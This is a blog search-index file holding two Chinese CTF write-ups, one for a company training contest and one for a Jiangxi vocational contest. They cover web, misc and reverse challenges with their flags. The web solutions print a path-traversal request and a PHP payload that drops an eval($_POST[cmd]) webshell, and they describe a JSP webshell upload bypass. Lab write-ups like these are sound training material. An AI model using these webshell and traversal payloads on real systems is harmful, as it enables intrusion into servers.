<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2024年某公司内部训练赛</title>
    <link href="/2024/11/02/2024-nb-xls-qmxc/"/>
    <url>/2024/11/02/2024-nb-xls-qmxc/</url>
    
    <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="0x01-签到"><a href="#0x01-签到" class="headerlink" title="0x01 签到"></a>0x01 签到</h3><p><img src="/../2024-nb-xls-qmxc/image1.png"></p><p>根据题目的提示</p><p>直接读取flag文件即可</p><p><img src="/../2024-nb-xls-qmxc/image2.png"></p><p>修改请求</p><p>&#x2F;icons&#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;flag</p><p><img src="/../2024-nb-xls-qmxc/image3.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;205d81bf-4985-4ee2-a2a6-cdba21a368d0&#125;<br></code></pre></td></tr></table></figure><h3 id="0x02-upload"><a href="#0x02-upload" class="headerlink" title="0x02 upload"></a>0x02 upload</h3><p><img src="/../2024-nb-xls-qmxc/image4.png"></p><p><img src="/../2024-nb-xls-qmxc/image5.png"><br>上传jsp一句话木马，</p><p>对文件的后缀会进行拦截并实体化输出不执行，使用双文件名绕过</p><p>jjspsp</p><p>可以看到成功上传jsp</p><p><img src="/../2024-nb-xls-qmxc/image6.png"></p><p>访问并测试蚁剑是否连接</p><p><img src="/../2024-nb-xls-qmxc/image7.png"></p><p><img src="/../2024-nb-xls-qmxc/image8.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;e1b38cee-6901-4dd1-9897-40583c7ff860&#125;<br></code></pre></td></tr></table></figure><h3 id="0x03-ez-upload"><a href="#0x03-ez-upload" class="headerlink" title="0x03 ez_upload"></a>0x03 ez_upload</h3><p><img src="/../2024-nb-xls-qmxc/image9.png"></p><p><img src="/../2024-nb-xls-qmxc/image10.png"></p><p>扫描得到文件上传的路径</p><p>测试发现允许上传图片类型的文件，尝试使用条件竞争</p><p>并发上传和访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php <br>fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;); <br>?&gt;<br></code></pre></td></tr></table></figure><p><img src="/../2024-nb-xls-qmxc/image11.png"></p><p><img src="/../2024-nb-xls-qmxc/image12.png"></p><p>访问shell.php</p><p><img src="/../2024-nb-xls-qmxc/image13.png"></p><p>蚁剑测试连接</p><p><img src="/../2024-nb-xls-qmxc/image14.png"></p><p><img src="/../2024-nb-xls-qmxc/image15.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;5dffd599-73d9-4425-9869-8bd4baa334dc&#125;<br></code></pre></td></tr></table></figure><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="0x01-flooding"><a href="#0x01-flooding" class="headerlink" title="0x01 flooding"></a>0x01 flooding</h3><p><img src="/../2024-nb-xls-qmxc/image16.png"></p><p><img src="/../2024-nb-xls-qmxc/image17.png"></p><p>观察流量可以看到传输地址处有十六进制数据，且最后两位数字都不相同，提取查看解码之后的内容</p><p><img src="/../2024-nb-xls-qmxc/image18.png"></p><p>进行base32解码，得到后半段flag</p><p><img src="/../2024-nb-xls-qmxc/image19.png"></p><p>4fc8-8aad-f42f87fcac2b}</p><p>再继续观察数据包的前段流量</p><p><img src="/../2024-nb-xls-qmxc/image20.png"></p><p><img src="/../2024-nb-xls-qmxc/image21.png"></p><p>观察两段流量后发现，再hi后面的字符有变动，将其提取</p><p>ZmxhZ3s1NTdiNjUyYi1kZDRlLQ&#x3D;&#x3D;</p><p>进行base64解码后得到前半段flag</p><p><img src="/../2024-nb-xls-qmxc/image22.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;557b652b-dd4e-4fc8-8aad-f42f87fcac2b&#125;<br></code></pre></td></tr></table></figure><h3 id="0x02-png-1"><a href="#0x02-png-1" class="headerlink" title="0x02 png_1"></a>0x02 png_1</h3><p><img src="/../2024-nb-xls-qmxc/image23.png"></p><p><img src="/../2024-nb-xls-qmxc/image24.png"></p><p>将十六进制放到HXD中</p><p><img src="/../2024-nb-xls-qmxc/image25.png"></p><p><img src="/../2024-nb-xls-qmxc/image26.png"></p><p>缺少了文件头，添加一个png文件头部</p><p><img src="/../2024-nb-xls-qmxc/image27.png"></p><p><img src="/../2024-nb-xls-qmxc/image28.png"></p><p>平平无奇，放到工具里显示crc报错，猜测可能修改过宽高</p><p><img src="/../2024-nb-xls-qmxc/image29.png"></p><p>使用脚本计算出原始宽高crc</p><p><img src="/../2024-nb-xls-qmxc/image30.png"></p><p><img src="/../2024-nb-xls-qmxc/image31.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;5730abaf-2365-4762-b228-e167769227c1&#125;<br></code></pre></td></tr></table></figure><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="0x01-apk"><a href="#0x01-apk" class="headerlink" title="0x01 apk"></a>0x01 apk</h3><p><img src="/../2024-nb-xls-qmxc/image32.png"></p><p>两个主要文件</p><p>一个是zbase32加密</p><p>另一个主函数文件为待解密密文</p><p><img src="/../2024-nb-xls-qmxc/image33.png"></p><p>c3sgn355cp1seqj1gw3skmmggo5dnmjwgy3snmjagr5u1mjigo3gcqbtg3udna3uci6o&#x3D;&#x3D;&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lain">https://www.dcode.fr/z-base-32-encoding<br></code></pre></td></tr></table></figure><p><img src="/../2024-nb-xls-qmxc/image34.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;ced9253e-f461-403a-8179-542f816f1c3e&#125;<br></code></pre></td></tr></table></figure><h3 id="0x02-xor"><a href="#0x02-xor" class="headerlink" title="0x02 xor"></a>0x02 xor</h3><p><img src="/../2024-nb-xls-qmxc/image35.png"></p><p>主代码</p><p>小端序与key异或即可</p><p><img src="/../2024-nb-xls-qmxc/image36.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">key = &#x27;SEcRET7&#x27;<br>enc = [0x35, 0x29, 0x02, 0x35, 0x3E, 0x35, 0x0F, 0x60,<br>0x20, 0x06, 0x64, 0x26, 0x65, 0x1A, 0x61, 0x77,<br>0x5A, 0x64, 0x68, 0x60, 0x53, 0x60, 0x20, 0x4E,<br>0x6B, 0x21, 0x67, 0x54, 0x7E, 0x71, 0x51, 0x64,<br>0x75, 0x60, 0x51, 0x64, 0x73, 0x05, 0x65, 0x21,<br>0x61, 0x4A]<br>for i in range(len(enc)):<br>    enc[i] ^= ord(key[i % 7])<br>for x in enc:<br>    print(chr(x), end=&#x27;&#x27;)<br>flag&#123;a83ee6c1-2296-4d3e-9d3c-42604f76f7d5&#125;<br></code></pre></td></tr></table></figure><h3 id="0x03-RC4"><a href="#0x03-RC4" class="headerlink" title="0x03 RC4"></a>0x03 RC4</h3><p><img src="/../2024-nb-xls-qmxc/image37.png"><br>直接将加密过后的hex进行rc解密即可</p><p><img src="/../2024-nb-xls-qmxc/image38.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">88 76 D7 7A B4 5A 4C C7 DC EF C9 8E DA 59 0E 98 8F FB 0B D4 E2 B1 13 60 E6 C7 86 2B DC 71 D4 30 ED 2A 89 61 83 80 28 F2 92 E2<br>The quick brown fox jumps over a lazy dog.<br></code></pre></td></tr></table></figure><p><img src="/../2024-nb-xls-qmxc/image39.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;c8fd99f1-841a-44c9-8d38-746db6ff95c1&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2024年江西省“振兴杯”职业技能大赛信息安全测试员(渗透测试员)赛项 Misc-wp</title>
    <link href="/2024/10/27/2024-JX-ZXB-stcsy-misc/"/>
    <url>/2024/10/27/2024-JX-ZXB-stcsy-misc/</url>
    
    <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="0x01-haveflag2"><a href="#0x01-haveflag2" class="headerlink" title="0x01 haveflag2"></a>0x01 haveflag2</h4><p><img src="/../2024-JX-ZXB-stcsy-misc/image.png"></p><p>发现http流量中有压缩包，导出http</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image1.png"></p><p>分析压缩包，无密码解压得到一张图片和一个word文档</p><p>先对文档分析，空白的，全选设置字体为红色得到一串字符</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image2.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">FGsdtu89$<br></code></pre></td></tr></table></figure><p>word文档分析没有其他东西再转向图片文件分析</p><p>分析到图片尾部发现图片中还有个压缩包，而压缩包的内容为另一张png图片</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image3.png"></p><p>将内容复制出来，或者使用工具对其进行分离</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image4.png"></p><p>搜索png图片的文件尾部</p><p>从PK压缩包头部50 4B开始复制另存为一个新文件</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image5.png"></p><p><img src="/../2024-JX-ZXB-stcsy-misc/image6.png"></p><p>可以看到压缩包有加密</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image7.png"></p><p>这时候可以用到word文档中的那串字符尝试进行解密</p><p>尝试解密发现就是压缩包的密码</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image8.png"></p><p>得到一张二维码，使用CQR二维码解码工具进行扫描</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image9.png"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;fjgnc59TJoomcewmzrr0vnsmi&#125;<br></code></pre></td></tr></table></figure><h4 id="0x02-文字文稿1"><a href="#0x02-文字文稿1" class="headerlink" title="0x02 文字文稿1"></a>0x02 文字文稿1</h4><p><img src="/../2024-JX-ZXB-stcsy-misc/image10.png"></p><p>拿到题目附件</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image11.png"></p><p>发现有一句诗，全选一下设置字体为红色</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image12.png"><br>可以发现word文档底部还有一串摩斯电码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">..--- -.-. ....- ----- ....<br></code></pre></td></tr></table></figure><p><img src="/../2024-JX-ZXB-stcsy-misc/image13.png"></p><p>使用工具解码后得到一串字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">2C40H<br></code></pre></td></tr></table></figure><p>这时候想到去分析文件的数据</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image14.png"></p><p>可以看到文件中有txt文本，还有一串base编码</p><p>，我们先对base编码进行解码操作，base64解码</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image15.png"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;rlnujmbsf4d19ytoexi0wpgq7czh82v3&#125;<br></code></pre></td></tr></table></figure><p>这时候想继续去分析一下txt文件，使用工具对word文档进行分离</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image16.png"></p><p><img src="/../2024-JX-ZXB-stcsy-misc/image17.png"></p><p>解压查看txt文件内容</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image18.png"></p><p>文件大小为0</p><p>可能正是和文本文件的名字一样，用来误导ctfer的，所以说做题的时候还是需要仔细分析，如果真到山穷水尽的时候不妨回头看看</p><h4 id="0x03-aaa"><a href="#0x03-aaa" class="headerlink" title="0x03 aaa"></a>0x03 aaa</h4><p><img src="/../2024-JX-ZXB-stcsy-misc/image19.png"></p><p>拿到内存镜像，使用vol分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">./volatility_2.6 -f aaa.raw imageinfo<br></code></pre></td></tr></table></figure><p><img src="/../2024-JX-ZXB-stcsy-misc/image20.png"></p><p>使用filescan插件进行筛选</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">./volatility_2.6 -f aaa.raw --profile=Win7SP1x64 filescan | grep -E &quot;txt|zip|flag&quot;<br></code></pre></td></tr></table></figure><p><img src="/../2024-JX-ZXB-stcsy-misc/image21.png"></p><p>搭配grep筛选包含关键字的内容</p><p>可以看到得到一个名为fll4g的zip压缩包</p><p>我们导出一下压缩包文件进行分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">./volatility_2.6 -f aaa.raw --profile=Win7SP1x64 dumpfiles -Q 0x00000000144b5590 -D ./<br></code></pre></td></tr></table></figure><p><img src="/../2024-JX-ZXB-stcsy-misc/image22.png"></p><p><img src="/../2024-JX-ZXB-stcsy-misc/image23.png"></p><p>文件加密，经过一番查找并未得到有关密码的内容，</p><p>现在只剩下俩个办法，对压缩包进行暴力破解   （X）</p><p>对内存镜像的用户密码进行破解</p><p><code>Passware Kit Forensic</code></p><p>使用到这个工具</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image24.png"></p><p>在主页选择内存分析</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image25.png"></p><p>选择好镜像后直接下一步，剩下的就是耐心等待</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image26.png"></p><p>得到admin用户的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">P@55w0rd!<br></code></pre></td></tr></table></figure><p>尝试使用这个密码对压缩包进行解压，发现是正确的密码</p><p><img src="/../2024-JX-ZXB-stcsy-misc/image27.png"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;64cf9601989168f7ced3aeea9064c411&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
